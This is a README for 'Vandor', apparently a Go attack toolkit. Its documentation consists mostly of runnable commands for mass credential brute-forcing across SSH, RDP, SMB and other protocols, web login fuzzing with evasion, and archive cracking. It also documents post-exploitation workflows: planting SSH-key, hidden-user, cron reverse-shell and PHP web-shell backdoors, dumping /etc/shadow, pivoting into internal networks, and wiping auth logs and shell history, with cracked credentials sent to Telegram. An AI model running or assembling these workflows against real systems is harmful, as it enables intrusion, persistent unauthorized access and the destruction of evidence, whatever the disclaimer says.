<div align="center">

# Vandor - Multi-Protocol Security Testing Framework

[![License](https://img.shields.io/badge/license-MIT-red.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)](https://golang.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/batmanpriv/Vandor)
[![Version](https://img.shields.io/badge/version-2.0.5-blue)](https://github.com/batmanpriv/Vandor)

**Multi-Protocol Attack Engine | Web Request Fuzzer | Archive Password Recovery | Anti-Forensic Module**

</div>

---

## 📌 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Quick Start Guide](#-quick-start-guide)
- [CLI Flags Reference](#-cli-flags-reference)
- [Attack Modes](#-attack-modes)
- [Web Inferno Module](#-web-inferno-module)
- [Archive Cracker](#-archive-cracker)
- [Checker Module](#-checker-module)
- [Post-Exploitation](#-post-exploitation)
- [Telegram Integration](#-telegram-integration)
- [Output Files](#-output-files)
- [Performance Tuning](#-performance-tuning)
- [FAQ](#-faq)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🔍 Overview

**Vandor** is a command-line security testing tool written in Go. It provides:

- **15+ protocol support** for brute-force attacks (SSH, RDP, FTP, MySQL, SMB, Telnet, VNC, PostgreSQL, Redis, MongoDB, POP3, IMAP, SMTP, SNMP, LDAP)
- **HTTP/HTTPS request fuzzing** with CSRF token extraction
- **RAR and ZIP archive password recovery**
- **Checker module** for validating credentials against live services
- **Anti-forensic operations** for authorized red team engagements
- **Post-exploitation features** including backdoor installation
- **Telegram notifications** for real-time alerts

> ⚠️ **Important**: This tool is designed for use **only on systems you own or have explicit written permission to test**. Unauthorized access is illegal.

---

## ✨ Features

### 1. Supported Protocols

| Protocol | Default Port | Authentication | Banner Grab |
|----------|--------------|----------------|-------------|
| SSH | 22 | Password | ✅ |
| RDP | 3389 | NLA, Password | ✅ |
| FTP | 21 | Anonymous, Password | ✅ |
| MySQL | 3306 | Native Password | ✅ |
| SMB/SMB2 | 445 | NTLM, NTLMv2 | ✅ |
| Telnet | 23 | Password | ✅ |
| VNC | 5900 | DES Challenge | ✅ |
| PostgreSQL | 5432 | MD5, SCRAM | ✅ |
| Redis | 6379 | AUTH | ✅ |
| MongoDB | 27017 | SCRAM-SHA-1 | ✅ |
| POP3 | 110 | PLAIN, LOGIN | ✅ |
| IMAP | 143 | PLAIN, LOGIN | ✅ |
| SMTP | 25 | PLAIN, LOGIN | ✅ |
| SNMP | 161 | Community String | ✅ |
| LDAP | 389 | Simple Bind | ✅ |

### 2. Core Capabilities

| Feature | Description |
|---------|-------------|
| **Multi-Protocol Attacks** | Test credential combinations across 15+ protocols |
| **Mass Pwn Mode** | Test all combinations against all hosts simultaneously |
| **Cross Mode** | All users × all passwords (default) |
| **Single Mode** | First user with first password, etc. |
| **Special Attack Modes** | Null, UserAsPass, Reverse |
| **Smart Password Generation** | Generate likely passwords based on usernames |
| **Checkpoint Resume** | Resume interrupted attacks from saved state (`-resume`) |
| **Honeypot Detection** | Identify fake services using signature patterns |
| **Anti-Forensic Module** | Clean logs, history, and memory after access |
| **Port Scanning** | Scan single ports, multiple ports, or ranges |
| **Service Detection** | Auto-detect services on open ports (`-auto-port`) |

### 3. Web Inferno Module

| Feature | Description |
|---------|-------------|
| **HTTP/HTTPS Support** | Send requests with custom methods, headers, and body |
| **Variable Substitution** | Replace `[[var]]`, `{{var}}`, `${var}` in URLs and body |
| **CSRF Token Extraction** | Auto-detect or manually extract tokens from responses |
| **Success/Failure Conditions** | Match response content (`-ifin`, `-ifnin`) |
| **Rate Limiting** | Control requests per second (`-web-rate`) |
| **Evasion Levels** | 0-5 levels of request obfuscation |
| **Intelligence Levels** | 0-3 learning capability |
| **GraphQL Support** | Test GraphQL endpoints (`-gql`) |
| **WebSocket Support** | Test WebSocket endpoints (`-ws`) |
| **OAuth2 Support** | Automatic token refresh |
| **Report Generation** | HTML and JSON reports |
| **Burp Suite Integration** | Import raw request files |

### 4. Archive Cracker

| Feature | Description |
|---------|-------------|
| **RAR v4/v5** | Dictionary attack on RAR archives |
| **ZIP** | Dictionary attack on ZIP archives |
| **Multi-threaded** | Configurable worker count |
| **Progress Display** | Real-time progress indicator |

### 5. Checker Module

| Feature | Description |
|---------|-------------|
| **cPanel** | Validate credentials on port 2083 |
| **WordPress** | Validate credentials on wp-login.php |
| **Auto-detect** | Try both cPanel and WordPress |
| **Smart Detection** | Detect service type from response |

### 6. Post-Exploitation

| Feature | Description |
|---------|-------------|
| **SSH Key Backdoor** | Install authorized_key for persistent access |
| **Hidden User** | Create stealth system account |
| **Reverse Shell** | Cron-based callback shell |
| **SSHd Port** | Open alternative SSH port |
| **Web Shell** | PHP backdoor in webroot |
| **All-in-One** | Deploy all backdoor types |
| **System Info** | Gather OS, kernel, user, and service information |
| **Hash Extraction** | Dump /etc/shadow and memory credentials |
| **Network Scanning** | Map internal network from compromised host |
| **Auto-Login Script** | Generate bash script for automated login |

### 7. Telegram Integration

| Feature | Description |
|---------|-------------|
| **Cracked Notifications** | Alert on successful credential discovery |
| **Honeypot Alerts** | Notify when honeypot detected |
| **Scan Complete** | Summary when attack finishes |
| **Banned Hosts** | Alert when host is banned |
| **Rate Limiting** | Prevents spam (20 messages/sec) |

---

## 📥 Installation

### Prerequisites

- Go 1.21 or higher
- Git (for building from source)
- OS: Windows, Linux, or macOS

### Method 1: Go Install (Recommended)

```bash
# Install latest version
go install -ldflags="-s -w" github.com/batmanpriv/Vandor@2.0.5

# Verify installation
Vandor -example
```

### Method 2: Build from Source

```bash
# Clone repository
git clone https://github.com/batmanpriv/Vandor.git
cd Vandor

# Download dependencies
go mod tidy

# Build for current OS
go build -ldflags="-s -w" -o Vandor main.go

# Build for specific platforms
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o Vandor-linux-amd64 main.go
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o Vandor.exe main.go
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o Vandor-mac-arm64 main.go
```

### Dependencies

```bash
# Required Go modules (auto-downloaded with go mod tidy)
go get github.com/fatih/color
go get golang.org/x/crypto/ssh
go get golang.org/x/time/rate
go get github.com/go-sql-driver/mysql
go get github.com/jackc/pgx/v4
go get github.com/gomodule/redigo/redis
go get github.com/emersion/go-imap
go get github.com/go-ldap/ldap/v3
go get github.com/gosnmp/gosnmp
go get github.com/nwaples/rardecode
go get github.com/alexmullins/zip
go get github.com/google/uuid
go get github.com/gorilla/websocket
```

### Verify Installation

```bash
# Check if Vandor is in PATH
which Vandor

# Test help menu
Vandor -example

# Check version
Vandor -h
```

---

## 🚀 Quick Start Guide

### Basic Examples

```bash
# SSH attack on a single host
Vandor -hs 192.168.1.100 -u root -psw password123 -p ssh

# SSH attack with user and password files
Vandor -hs targets.txt -u users.txt -psw rockyou.txt -p ssh

# CIDR network scan
Vandor -hs 192.168.1.0/24 -u admin -psw admin123 -p ssh

# Custom SSH port
Vandor -hs 192.168.1.100 -u root -psw pass.txt -p ssh -P 2222

# Port scan
Vandor -hs 192.168.1.1 -ps 22,80,443,3389

# RDP attack
Vandor -hs 192.168.1.100 -u administrator -psw pass.txt -p rdp

# SMB attack
Vandor -hs 192.168.1.100 -u admin -psw pass.txt -p smb

# Telnet attack (IoT devices)
Vandor -hs 192.168.1.100 -u root -psw pass.txt -p telnet

# Web form attack
Vandor -hs target.com -u admin -psw passwords.txt \
  -http-path /login \
  -http-user-field username \
  -http-pass-field password

# Enable honeypot detection
Vandor -hs suspicious.net -u test -psw test123 -honeypot

# Enable anti-forensic mode
Vandor -hs target.com -c creds.txt -anti-forensic

# Resume from checkpoint
Vandor -hs targets.txt -c creds.txt -resume
```

### Real-World Scenarios

#### Scenario 1: Corporate Network Assessment

```bash
# Step 1: Discover alive hosts with port scan
Vandor -hs 10.10.10.0/24 -ps 22,3389,445,80,443 -threads 1000

# Step 2: Attack discovered SSH services
Vandor -hs LIVE.txt -u users.txt -psw rockyou.txt -p ssh -smart-pass

# Step 3: Post-exploitation on successful cracks
Vandor -hs valid.txt -c creds.txt -post-exploit -scan-network -backdoor
```

#### Scenario 2: Web Application Testing

```bash
# Step 1: Capture login request in Burp Suite
# Step 2: Save request to login.txt

# Step 3: Attack with Web Inferno
Vandor -req login.txt \
  -web-var "user=users.txt,pass=passwords.txt" \
  -ifin "dashboard" \
  -ifnin "invalid"

# Step 4: Check credentials on live servers
Vandor -check -check-targets web_success.txt -check-type auto
```

#### Scenario 3: IoT Device Security

```bash
# Scan for telnet and SSH on IoT range
Vandor -hs 192.168.0.0/16 -ps 23,22 -threads 5000

# Attack with default credentials
Vandor -hs LIVE.txt -u default_users.txt -psw default_passwords.txt -p telnet -mass-pwn
```

---

## 📚 CLI Flags Reference

### Core Parameters

| Flag | Description | Example |
|------|-------------|---------|
| `-hs` | Hosts file, CIDR, or single IP | `-hs 192.168.1.100` |
| `-u` | Username or users file | `-u users.txt` |
| `-psw` | Password or passwords file | `-psw rockyou.txt` |
| `-c` | Credentials file (user:pass format) | `-c creds.txt` |
| `-p` | Protocol (ssh, rdp, ftp, mysql, smb, telnet, vnc, postgres, redis, mongodb, pop3, imap, smtp, snmp, ldap) | `-p ssh` |
| `-P` | Custom port | `-P 2222` |
| `-t` | Timeout in seconds | `-t 5` |
| `-threads` | Concurrent threads | `-threads 10000` |
| `-m` | Mode: cross or single | `-m cross` |

### Attack Modes

| Flag | Description | Example |
|------|-------------|---------|
| `-attack-mode` | normal, null, userpass, reverse | `-attack-mode null` |
| `-mass-pwn` | Attack all hosts × all users × all passwords | `-mass-pwn` |
| `-smart-pass` | Generate smart passwords | `-smart-pass` |
| `-min-delay` | Minimum random delay (ms) | `-min-delay 100` |
| `-max-delay` | Maximum random delay (ms) | `-max-delay 500` |

### Scanning & Detection

| Flag | Description | Example |
|------|-------------|---------|
| `-ps` | Port scan (comma separated or range) | `-ps 22,80,443` |
| `-auto-port` | Auto detect service port | `-auto-port` |
| `-skip-alive` | Skip alive check | `-skip-alive` |
| `-honeypot` | Enable honeypot detection | `-honeypot` |

### Anti-Forensic & Post-Exploit

| Flag | Description | Example |
|------|-------------|---------|
| `-anti-forensic` | Enable anti-forensic operations | `-anti-forensic` |
| `-post-exploit` | Gather system info after cracking | `-post-exploit` |
| `-backdoor` | Install backdoor on cracked hosts | `-backdoor` |
| `-backdoor-type` | ssh-key, hidden-user, reverse-shell, sshd-port, web-shell, all | `-backdoor-type ssh-key` |
| `-backdoor-port` | Port for backdoor | `-backdoor-port 22222` |
| `-backdoor-user` | Hidden username | `-backdoor-user sysupdate` |
| `-backdoor-pass` | Password for hidden user | `-backdoor-pass P@ssw0rd123!` |
| `-scan-network` | Scan internal network after access | `-scan-network` |
| `-extract-hash` | Extract password hashes | `-extract-hash` |
| `-gen-script` | Generate auto-login script | `-gen-script` |

### Web Inferno Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-req` | Request file or direct URL | `-req login.txt` |
| `-web-var` | Variables: file or inline | `-web-var "user=users.txt,pass=pass.txt"` |
| `-ifin` | Success condition (response contains) | `-ifin "Welcome"` |
| `-ifnin` | Failure condition (response contains) | `-ifnin "Invalid"` |
| `-web-out` | Output file for matches | `-web-out success.txt` |
| `-web-fail` | Output file for failures | `-web-fail failed.txt` |
| `-web-tokens` | Output file for extracted tokens | `-web-tokens tokens.txt` |
| `-web-out-format` | Custom output format | `-web-out-format "{user}:{pass}"` |
| `-web-threads` | Number of threads | `-web-threads 50` |
| `-web-rate` | Rate limit (requests/second) | `-web-rate 100` |
| `-web-timeout` | Timeout in seconds | `-web-timeout 10` |
| `-web-evasion` | Evasion level (0-5) | `-web-evasion 3` |
| `-web-intel` | Intelligence level (0-3) | `-web-intel 2` |
| `-web-method` | HTTP method for direct URL | `-web-method POST` |
| `-web-body` | Request body for direct URL | `-web-body '{"user":"[[user]]"}'` |
| `-web-headers` | Custom headers | `-web-headers "X-Custom: value"` |
| `-dynamic-token` | Enable dynamic token extraction | `-dynamic-token` |
| `-token-url` | URL to fetch token from | `-token-url https://target.com/login` |
| `-token-start` | Start string for token extraction | `-token-start 'csrf_token":"'` |
| `-token-end` | End string for token extraction | `-token-end '"'` |
| `-token-field` | Variable name for token | `-token-field csrf_token` |
| `-web-debug` | Enable debug mode | `-web-debug` |
| `-web-json` | Force JSON content type | `-web-json` |
| `-web-xml` | Force XML content type | `-web-xml` |

### GraphQL & WebSocket

| Flag | Description | Example |
|------|-------------|---------|
| `-gql` | GraphQL endpoint | `-gql https://api.com/graphql` |
| `-ws` | WebSocket URL | `-ws ws://target.com/socket` |

### Archive Cracker Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-rar` | RAR file path | `-rar archive.rar` |
| `-rar-dict` | Password dictionary for RAR | `-rar-dict rockyou.txt` |
| `-rar-workers` | Workers for RAR cracking | `-rar-workers 1000` |
| `-rar-buffer` | Buffer size for RAR | `-rar-buffer 10000` |
| `-zip` | ZIP file path | `-zip backup.zip` |
| `-zip-dict` | Password dictionary for ZIP | `-zip-dict rockyou.txt` |
| `-zip-workers` | Workers for ZIP cracking | `-zip-workers 1000` |
| `-zip-buffer` | Buffer size for ZIP | `-zip-buffer 10000` |

### Checker Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-check` | Enable checker mode | `-check` |
| `-check-targets` | Targets file (url or url:user:pass) | `-check-targets targets.txt` |
| `-check-creds` | Credentials file (user:pass) | `-check-creds creds.txt` |
| `-check-type` | cpanel, wordpress, auto | `-check-type auto` |
| `-check-out` | Output file | `-check-out results.txt` |
| `-check-out-format` | url:user:pass or user:pass@url | `-check-out-format url:user:pass` |
| `-check-smart` | Enable smart detection | `-check-smart` |

### Performance & Misc

| Flag | Description | Example |
|------|-------------|---------|
| `-gpu` | Enable GPU acceleration | `-gpu` |
| `-ramdisk` | Use RAM disk for ultra-fast I/O | `-ramdisk` |
| `-multi-city` | Route through multiple cities | `-multi-city` |
| `-monitor` | Enable real-time monitoring | `-monitor` |
| `-json` | Export JSON results | `-json` |
| `-csv` | Export CSV results | `-csv` |
| `-resume` | Resume from checkpoint | `-resume` |
| `-not` | Telegram notification mode (0=off, 1=on crack, 2=on completion) | `-not 1` |
| `-bot-token` | Telegram bot token | `-bot-token "123:ABC"` |
| `-chat-id` | Telegram chat ID | `-chat-id "456"` |
| `-example` | Show usage examples | `-example` |

---

## ⚔️ Attack Modes

### Cross Mode (Default)
All users × all passwords

```bash
Vandor -hs target.com -u users.txt -psw passes.txt -m cross
```

### Single Mode
First user with first password, second user with second password, etc.

```bash
Vandor -hs target.com -u users.txt -psw passes.txt -m single
```

### Null Mode
Empty password

```bash
Vandor -hs target.com -u root -attack-mode null
```

### UserAsPass Mode
Password equals username

```bash
Vandor -hs target.com -u admin -attack-mode userpass
```

### Reverse Mode
Password equals reversed username

```bash
Vandor -hs target.com -u admin -attack-mode reverse
```

### Mass PWN Mode
Everything × everything simultaneously

```bash
Vandor -hs hosts.txt -u users.txt -psw passes.txt -mass-pwn
```

---

## 🌋 Web Inferno Module

### 1. Basic Web Attack

```bash
# Attack with file-based variables
Vandor -req login.txt \
  -web-var "user=users.txt,pass=passwords.txt" \
  -ifin "Welcome" \
  -ifnin "Invalid"

# Inline variables
Vandor -req https://api.example.com/login \
  -web-var "user=admin,pass=passwords.txt" \
  -web-method POST \
  -web-body '{"username":"[[user]]","password":"[[pass]]"}' \
  -ifin "token"

# Custom output format
Vandor -req login.txt \
  -web-var "user=users.txt,pass=pass.txt,host=hosts.txt" \
  -web-out-format "{user}:{pass}@{host}" \
  -ifin "success"
```

### 2. Capturing a Request in Burp Suite

```
1. Open Burp Suite
2. Enable Proxy (127.0.0.1:8080)
3. Navigate to target login page
4. Submit a test login
5. Find the POST request in Proxy > HTTP History
6. Right-click > Copy > Request
7. Save to file (e.g., login.txt)
```

### 3. Token Handling

```bash
# Automatic CSRF token detection
Vandor -req login.txt \
  -web-var "user=users.txt,pass=pass.txt" \
  -auto-token \
  -ifin "dashboard"

# Manual token extraction with regex
Vandor -req login.txt \
  -web-var "user=users.txt,pass=pass.txt" \
  -token-regex 'csrf_token":"([^"]+)"' \
  -ifin "Welcome"

# Dynamic token (fetch from another URL)
Vandor -req login.txt \
  -dynamic-token \
  -token-url https://target.com/login \
  -token-start 'name="csrf" value="' \
  -token-end '"' \
  -token-refresh 5 \
  -token-field csrf_token
```

### 4. Evasion Levels

| Level | Name | Techniques |
|-------|------|------------|
| 0 | None | No evasion |
| 1 | Basic | Random User-Agent |
| 2 | Moderate | Sec-Ch-UA headers, Accept-Language |
| 3 | Advanced | X-Forwarded-For, DNT, Cache-Control |
| 4 | Paranoid | Random IP headers, Connection pooling |
| 5 | Insane | Request ID injection |

```bash
# Use evasion level 4
Vandor -req login.txt -web-evasion 4 -web-var "user=users.txt,pass=pass.txt"

# Intelligence levels (0-3)
# 0 = Dumb: Just check status codes
# 1 = Smart: Basic pattern matching
# 2 = Genius: Learns from responses
# 3 = God: Predicts success with pattern learning

Vandor -req login.txt -web-intel 3 -web-learn
```

### 5. GraphQL Attack

```bash
# GraphQL endpoint testing
Vandor -gql https://api.example.com/graphql \
  -web-body 'query {user(name:"[[user]]") {password}}' \
  -web-var "user=users.txt" \
  -ifin "data"

# With variables
Vandor -gql https://api.example.com/graphql \
  -web-body '{"query":"query($user:String!){user(name:$user){password}}","variables":{"user":"[[user]]"}}' \
  -web-var "user=users.txt" \
  -ifin "password"
```

### 6. WebSocket Attack

```bash
# WebSocket fuzzing
Vandor -ws ws://target.com/socket \
  -web-var "user=users.txt,pass=pass.txt" \
  -web-body '{"type":"login","username":"[[user]]","password":"[[pass]]"}' \
  -ifin "success"
```

---

## 📦 Archive Cracker

### RAR Cracking

```bash
# Basic RAR crack
Vandor -rar secret.rar -rar-dict rockyou.txt

# With custom worker count (default: CPU*2)
Vandor -rar encrypted.rar -rar-dict passwords.txt -rar-workers 2000

# Large buffer for huge wordlists
Vandor -rar archive.rar -rar-dict 10million.txt -rar-buffer 50000

# Output example:
# [RAR] Loading RAR file: archive.rar
# [RAR] File size: 2.34 MB
# [RAR] Loaded 14,000,000 passwords
# [RAR] Starting 16 workers...
# [RAR] Progress: 45.2% (6,328,000/14,000,000)
# 
# ✓ FOUND PASSWORD: P@ssw0rd2024!
```

### ZIP Cracking

```bash
# Basic ZIP crack
Vandor -zip backup.zip -zip-dict rockyou.txt

# High-performance cracking
Vandor -zip protected.zip -zip-dict rockyou.txt -zip-workers 1000 -zip-buffer 20000

# Results saved to cracked_passwords.txt
```

---

## ✅ Checker Module

### Basic Usage

```bash
# Check cPanel credentials
Vandor -check \
  -check-targets targets.txt \
  -check-creds creds.txt \
  -check-type cpanel

# Check WordPress credentials
Vandor -check \
  -check-targets targets.txt \
  -check-creds creds.txt \
  -check-type wordpress

# Auto-detect (try both)
Vandor -check \
  -check-targets targets.txt \
  -check-creds creds.txt \
  -check-type auto

# With custom output
Vandor -check \
  -check-targets targets.txt \
  -check-creds creds.txt \
  -check-out results.txt \
  -check-out-format user:pass@url
```

### Targets File Format

```text
# Each line can be:
# - URL only (uses all credentials)
# - URL:user:pass (uses specific credentials)
# - URL|user:pass (alternative format)

https://example.com
https://example.com:2083
https://example.com|admin:password
https://example.com:admin:password
```

### Credentials File Format

```text
# user:pass format
admin:admin
root:password
user:pass123
```

---

## 🐚 Post-Exploitation

### Complete Post-Exploit Workflow

```bash
# 1. Attack and crack
Vandor -hs targets.txt -u root -psw rockyou.txt -p ssh

# 2. Run full post-exploitation on successes
Vandor -hs valid.txt -c creds.txt -post-exploit

# What gets collected:
# - Hostname, OS, kernel version
# - User list and sudo privileges
# - Running services
# - Open ports
# - Process list
# - Network connections
# - SSH keys (and fingerprints)
# - Cron jobs
# - Web servers (Apache, Nginx)
# - Databases (MySQL, PostgreSQL, Redis)

# 3. Deploy backdoors
Vandor -hs valid.txt -c creds.txt -backdoor -backdoor-type all

# 4. Scan internal network from compromised host
Vandor -hs valid.txt -c creds.txt -scan-network

# 5. Extract password hashes
Vandor -hs valid.txt -c creds.txt -extract-hash

# 6. Generate auto-login script
Vandor -hs valid.txt -c creds.txt -gen-script
```

### Backdoor Types

```bash
# SSH Key Backdoor (Most Stealthy)
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type ssh-key \
  -backdoor-key "ssh-rsa AAAAB3NzaC1yc2E..."

# Hidden User Backdoor
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type hidden-user \
  -backdoor-user sysupdate \
  -backdoor-pass "P@ssw0rd123!"

# Reverse Shell (Persistent via Cron)
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type reverse-shell \
  -backdoor-port 31337

# Alternative SSH Port
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type sshd-port \
  -backdoor-port 22222

# PHP Web Shell
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type web-shell

# Deploy Everything
Vandor -hs target.com -c valid.txt -backdoor \
  -backdoor-type all \
  -backdoor-port 22222 \
  -backdoor-user sysupdate \
  -backdoor-pass "P@ssw0rd123!"
```

### Anti-Forensic Operations

```bash
# Enable anti-forensic mode
Vandor -hs target.com -c creds.txt -anti-forensic

# What it does automatically:
# 1. Wipes /var/log/auth.log and /var/log/secure
# 2. Clears ~/.bash_history and ~/.zsh_history
# 3. Shreds temporary files
# 4. Scrub memory of credentials
# 5. Removes command history from SSH sessions
# 6. Resets lastlog entries
# 7. Clears systemd journal logs
# 8. Creates SOCKS5 proxy (127.0.0.1:1080)
# 9. Dumps /etc/shadow and /etc/passwd
```

---

## 📱 Telegram Integration

### Setup

```bash
# 1. Create a bot on Telegram (via @BotFather)
# 2. Get your bot token
# 3. Get your chat ID (via @userinfobot)
# 4. Use in command:
Vandor -hs targets.txt -u users.txt -psw passes.txt \
  -bot-token "YOUR_BOT_TOKEN" \
  -chat-id "YOUR_CHAT_ID" \
  -not 1
```

### Notification Types

| Mode | Description |
|------|-------------|
| `-not 0` | No notifications (default) |
| `-not 1` | Notify on each successful crack |
| `-not 2` | Notify only on scan completion |

### Example Notifications

```
🔓 CRACKED!
📍 Host: 192.168.1.100
🔌 Port: 22
👤 User: root
🔑 Pass: P@ssw0rd123
🖥️ Banner: SSH-2.0-OpenSSH_8.2

🍯 HONEYPOT DETECTED!
📍 Host: 185.110.188.4
📊 Confidence: 92%
🔍 Reason: Cowrie SSH honeypot signature

✅ SCAN COMPLETED!
⏱️ Duration: 2h 15m
🔓 Found: 47 credentials
🍯 Honeypots: 3
```

---

## 📁 Output Files

| File | Format | Description |
|------|--------|-------------|
| `LIVE.txt` | IP:port | Hosts that responded to ping/tcp |
| `open_ports.txt` | IP:port | Discovered open ports |
| `Cracked.txt` | host:port\|user:pass\|protocol | All cracked credentials |
| `results.json` | JSON | Full attack statistics |
| `results.csv` | CSV | Credentials in table format |
| `checkpoint.json` | JSON | Resume information (auto-saved every 30s) |
| `web_success.txt` | vars | Successful web attacks |
| `web_failed.txt` | vars | Failed web attempts |
| `extracted_tokens.txt` | token | Captured CSRF tokens |
| `webinferno_report.html` | HTML | Visual attack report |
| `webinferno_report.json` | JSON | Web attack statistics |
| `postexploit_*.json` | JSON | System information |
| `auto_login.sh` | Bash | Automated login script |
| `internal_network.txt` | IPs | Discovered internal hosts |
| `dumped_creds/*.json` | JSON | Extracted credentials |
| `hashes_*.txt` | Hash | Password hashes |
| `checker_results.txt` | url:user:pass | Validated credentials |

---

## ⚡ Performance Tuning

### Thread Optimization

```bash
# Local network (low latency)
Vandor -hs 192.168.1.0/24 -threads 10000 -t 2

# Internet targets (higher latency)
Vandor -hs targets.txt -threads 2000 -t 10

# Slow targets (IoT, embedded)
Vandor -hs iot.txt -threads 500 -t 15 -min-delay 200 -max-delay 1000
```

### RAM Disk Mode (Linux only)

```bash
# Enable RAM disk for faster I/O
Vandor -hs large_wordlist.txt -u users.txt -psw rockyou.txt -ramdisk

# Uses /dev/shm (tmpfs) for temporary files
# 5-10x faster file operations
# Automatic cleanup on exit
```

### Checkpoint Resume

```bash
# Save progress every 30 seconds
# Resume interrupted attacks
Vandor -hs targets.txt -c creds.txt -resume

# Checkpoint file: checkpoint.json
```

### Monitoring

```bash
# Enable real-time monitoring
Vandor -hs targets.txt -u users.txt -psw passes.txt -monitor

# Displays:
# - Goroutine count
# - Memory usage
# - Attempts count
# - Cracked count
# - Speed
```

---

## ❓ FAQ

### Q: How do I stop a running attack?

**A:** Multiple ways:
- Press `Ctrl+C` (graceful shutdown)
- Checkpoint saves progress automatically

### Q: Can I use my own wordlists?

**A:** Yes:
- Any text file with one entry per line
- UTF-8 encoding supported
- Comments lines start with #

### Q: Does Vandor support proxies?

**A:** Yes:
- HTTP/HTTPS proxies via `-proxy` flag
- SOCKS5 proxy built-in with `-anti-forensic`
- Multi-city routing with `-multi-city`

### Q: How accurate is honeypot detection?

**A:** Multi-signature analysis:
- Protocol mismatch: 25% confidence
- Response time anomalies: 20%
- Banner inconsistencies: 35%
- TCP timestamp analysis: 15%
- Combined confidence >80% = honeypot

### Q: Can I resume an interrupted attack?

**A:** Yes:
- Checkpoint saved every 30 seconds
- Use `-resume` flag
- Restores exact progress
- Skips already cracked hosts

### Q: What's the maximum password length?

**A:** No practical limit:
- Go strings support up to 2GB
- Dictionary files of any size
- Smart generation limited to 32 chars for performance

### Q: How to update Vandor?

**A:** Simple:
```bash
go install -ldflags="-s -w" github.com/batmanpriv/Vandor@latest
```

### Q: Does Vandor work on Windows?

**A:** Yes:
- Native Windows executable (.exe)
- All protocols work (including SMB)
- RAM disk mode uses %TEMP% instead of /dev/shm

### Q: What are the dependencies?

**A:** Minimal:
- Go standard library
- 15 external Go modules (auto-downloaded)
- No external binaries required

---

## ⚠️ Known Limitations

1. **RDP support** is limited and may not work with all Windows versions
2. **SMB** authentication is basic and doesn't support all NTLM variants
3. **VNC** cracking depends on DES encryption support
4. **GPU acceleration** is limited and primarily CPU-based
5. **RAR v5** support depends on external library capabilities
6. **WebSocket** support is basic and may not handle all protocols
7. **GraphQL** testing assumes standard endpoints

---

## 📜 Legal Disclaimer

```
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.

By using Vandor, you agree that:
1. You will only use this tool on systems you own or have explicit written permission to test
2. You are responsible for compliance with all applicable laws and regulations
3. The authors assume no liability for misuse or damage caused by this tool
4. Unauthorized access to computer systems is illegal in most jurisdictions
5. Always obtain proper authorization before conducting security assessments

Violations may result in:
- Civil lawsuits
- Criminal prosecution
- Permanent ban from security community
- Termination of employment (for professionals)

USE RESPONSIBLY. STAY LEGAL. BE ETHICAL.
```

---

## 🤝 Contributing

We welcome contributions:

- **Protocol Implementations**: Add more services
- **Bug Reports**: Open issues with detailed steps
- **Documentation**: More examples and tutorials
- **Performance**: Optimize concurrency

---

<div align="center">

**⭐ Star this repo if you find it useful! ⭐**

**Built for security researchers, by security researchers**

**[⬆ Back to Top](#-vandor---multi-protocol-security-testing-framework)**

</div>
